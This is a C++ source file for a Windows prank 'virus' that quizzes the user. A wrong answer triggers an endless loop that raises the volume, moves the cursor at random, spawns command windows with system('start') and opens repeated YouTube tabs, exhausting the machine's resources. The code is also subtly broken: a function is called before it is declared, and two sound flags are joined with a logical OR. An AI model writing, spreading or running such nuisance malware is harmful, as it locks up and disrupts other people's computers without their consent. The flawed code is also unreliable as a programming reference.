// NoVirus.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <windows.h>
#include <shellapi.h>
#include <iostream>
#include <mmsystem.h>
#pragma comment(lib, "winmm")
#pragma comment(lib, "winmm.lib")

using namespace std;
void changeVolume() {
    INPUT ip = { 0 };
    ip.type = INPUT_KEYBOARD;
    ip.ki.wVk = VK_VOLUME_UP;   //or VOLUME_DOWN or MUTE
    SendInput(1, &ip, sizeof(INPUT));
    ip.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &ip, sizeof(INPUT));
}

// Returns true if correct and false if incorrect
bool ask_question(string message, string answerOne, string answerTwo, int correctAnswer) {
    std::cout << message << endl;

    std::cout << "1)" << answerOne << endl;
    std::cout << "2)" << answerTwo << endl;

    string input;

    std::cin >> input;
    
    if (input == answerOne && correctAnswer == 1 || input == answerTwo && correctAnswer == 2) {
        std::cout << "Correct!" << endl;
        return true;
    }
    else {
        std::cout << "Incorrect" << endl;

        Die();

        return false;
    }
}

// Runs the virus if function is called
void Die() {
    for (int i = 0; i < 3; i++) {
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=KE1ynBZ-9Bw", 0, 0, SW_SHOWNORMAL);
    }
    ShellExecute(0, 0, L"https://www.youtube.com/watch?v=ZHmROm_CRH4", 0, 0, SW_SHOWNORMAL);
    int x, y;
    PlaySound(TEXT("music.wav"), NULL, SND_FILENAME || SND_ASYNC);
    while (true) {
        changeVolume();
        SetCursorPos(rand() % 1000, rand() % 800);
        system("start");
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=1d-n0Qi1ZvQ", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=VAnaq97yoM4", 0, 0, SW_SHOWNORMAL);
        ShellExecute(0, 0, L"https://www.youtube.com/watch?v=ZKWwiMaSoyE", 0, 0, SW_SHOWNORMAL);

    }
}

int main()
{
    ask_question("Is this a virus", "Yes", "No", 1); // message, answer one, answer two, correctt answer (1..2)
    ask_question("Do you know how you contracted this virus?", "Yes", "No", 1); //message, answer one, answer two, correctt answer (1..2)
    
    // Hides window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
}
